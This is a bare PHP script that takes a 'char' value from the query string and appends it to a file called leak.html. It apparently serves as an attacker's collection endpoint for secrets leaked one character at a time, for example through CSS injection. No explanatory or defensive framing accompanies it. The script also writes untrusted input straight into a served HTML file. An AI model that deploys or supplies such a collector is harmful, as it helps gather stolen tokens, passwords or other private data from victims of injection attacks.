<?php
    if (isset($_GET['char'])) {
        $char = $_GET['char'];
        $filePath = 'leak.html';
        $fileHandle = fopen($filePath, 'a');

        if ($fileHandle) {
            fwrite($fileHandle, $char);
            fclose($fileHandle);
        }
    }
?>